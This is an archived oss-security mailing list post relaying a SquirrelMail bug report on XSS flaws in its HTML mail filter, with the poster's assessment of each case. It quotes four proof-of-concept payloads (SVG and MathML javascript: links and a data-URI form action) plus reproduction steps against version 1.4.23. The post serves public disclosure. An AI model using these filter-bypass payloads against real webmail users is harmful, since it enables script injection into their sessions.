X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2257" "Wednesday" "27" "June" "2018" "12:26:09" "+0200" "Hanno =?UTF-8?B?QsO2Y2s=?=" "hanno@hboeck.de" "<20180627122609.11940d53@computer>" "73" "[oss-security] squirrelmail XSS issues in bug tracker since 2016" "^Date:" nil nil "6" "2018062710:26:09" "[oss-security] squirrelmail XSS issues in bug tracker since 2016" (number mark "        hanno@hboeck Jun 27   73/2257  " thread-indent "\"[oss-security] squirrelmail XSS issues in bug tracker since 2016\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 11304 invoked by uid 550); 27 Jun 2018 10:26:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 11265 invoked from network); 27 Jun 2018 10:26:16 -0000
Message-ID: <20180627122609.11940d53@computer>
X-Mailer: Claws Mail 3.16.0 (GTK+ 2.24.32; x86_64-pc-linux-gnu)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Date: Wed, 27 Jun 2018 12:26:09 +0200
From: Hanno =?UTF-8?B?QsO2Y2s=?= <hanno@hboeck.de>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] squirrelmail XSS issues in bug tracker since 2016
To: oss-security@lists.openwall.com

Hi,

I found this in the squirrelmail bug tracker:
https://sourceforge.net/p/squirrelmail/bugs/2831/
I'll paste the content below to have it archived in oss-security.

Squirrelmail had reacted slowly to security issues in the past and has
not released a new version for a long time, however security bugs (like
one RCE in 2017 and one directory traversal in 2018) tended to be
fixed within the SVN repo and snapshots, so running a snapshot seemed
like a safe option.

However it seems this bug report got ignored. It lists 4 possible
scenarios / PoCs for XSS. From my quick judgement they are not all
legit:

PoC1: I couldn't reproduce it (either it's fixed or the browser
behavior changed, I haven't verified in-depth).
PoC2: This is "XSS-via-data-uri", a data URI runs in its own origin,
thus I don't see how this is a security risk. It's not really an XSS.
PoC3/PoC4: Works in Firefox, seems legit.

Preventing XSS in webmail is a hard problem, so I wouldn't be surprised
if there's more to be found.

-------------------

There are multiple XSS vulnerabilities in the mail message display
page(functions/mime.php),the function magicHTML can not filter some
special tags.

The steps to reproduce are below:

Compose email content via HTML mode(use any other webmail client).The
HTML content is below: PoC1 (triggered in Chrome,Firefox):

<svg><a xlink:href=3D"javascript:alert(/XSS/)"><rect width=3D"1000"
height=3D"1000" fill=3D"white"/></a></svg>

PoC2 (triggered in Chrome,Firefox,safari):

<form
action=3D'data:text&sol;html,&lt;script&gt;alert(/XSS/)&lt/script&gt'><butt=
on></form>

PoC3 (triggered in Firefox):

<math><maction actiontype=3D"" xlink:href=3D"javascript:alert(/XSS/)">
Click here

PoC4 (triggered in Firefox):

<math xlink:href=3Djavascript:alert(/XSS/)> Click here

Choose one of PoCs and send it to squirrelmail webmail system.

Log in to squirrelmail webmail system and view the mail received(HTML
Version is opened)

Click the area in the content.The xss will be triggered

Version:
The testing squirrelmail webmail version is 1.4.23.Link is below:
http://squirrelmail.org/download.php
php:5.3.17
apache:2.2.12

--=20
Hanno B=C3=B6ck
https://hboeck.de/

mail/jabber: hanno@hboeck.de
GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
